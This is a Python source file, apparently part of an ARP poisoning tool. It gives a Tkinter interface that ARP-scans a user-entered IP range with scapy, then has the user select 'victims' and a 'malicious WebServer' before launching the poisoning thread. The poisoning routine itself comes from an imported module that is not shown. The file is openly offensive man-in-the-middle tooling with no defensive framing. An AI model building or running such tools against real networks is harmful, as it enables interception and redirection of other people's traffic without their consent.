from scapy.all import *
from poison import poison
import threading
from Tkinter import*
import sys
import os


class arpPoisoning():

    def __init__(self, interface, root):
        self.interface = interface
        self.root = root
        
    def selMalWebSrv(self):
        self.maliciousWebServer = []
        for widget in self.root.winfo_children():
            widget.destroy()
        OPTIONS = []
        for pktSnd, pktRcv in self.usedIPs:
            OPTIONS.append(pktRcv[ARP].psrc)
        Label(self.root, text='Select the malicious WebServer').pack()
        selectTargetIP = Listbox(self.root, selectmode="multiple", width=50)
        for each_item in range(len(OPTIONS)):
            selectTargetIP.insert(END, OPTIONS[each_item])
        selectTargetIP.pack()

        def get_target(self):
            for i in selectTargetIP.curselection():
                InIpArp = int(i)
                self.maliciousWebServer.append(
                    {"ip": self.usedIPs[InIpArp][1][ARP].psrc, "mac": self.usedIPs[InIpArp][1][ARP].hwsrc})
            self.myMAC = get_if_hwaddr(self.interface)
            proc_thread = None
            proc_thread = threading.Thread(target=self.startProcess)
            proc_thread.daemon = True
            proc_thread.start()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        Button(self.root, text="Execute", command=lambda:get_target(self)).pack()

    def select_arp_IP(self):
        self.target = []
        Label(self.root, text='Select the victim/victims').pack()
        OPTIONS = []
        for pktSnd, pktRcv in self.usedIPs:
            OPTIONS.append(pktRcv[ARP].psrc)

        select = Listbox(self.root, selectmode="multiple", width=50)
        for each_item in range(len(OPTIONS)):
            select.insert(END, OPTIONS[each_item])
        select.pack()

        def selectIpArp(self):
            for i in select.curselection():
                InIpArp = int(i)
                self.target.append(
                    {"ip": self.usedIPs[InIpArp][1][ARP].psrc, "mac": self.usedIPs[InIpArp][1][ARP].hwsrc})
            self.selMalWebSrv()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        Button(self.root, text="Execute", command=lambda:selectIpArp(self)).pack()

    def getInput(self):
        ipLabel = Label(self.root,
                        text='Enter the range of IPs (i.e.: 192.168.56.0/24)').pack()
        ipValue = Entry(self.root)
        ipValue.pack()

        def get_execute(self):
            self.rangeIPs = ipValue.get()
            self.usedIPs, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.rangeIPs), timeout=3,iface=self.interface)
            for widget in self.root.winfo_children():
                widget.destroy()
            self.select_arp_IP()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
        Button(self.root, text="Execute", command=lambda:get_execute(self)).pack()

    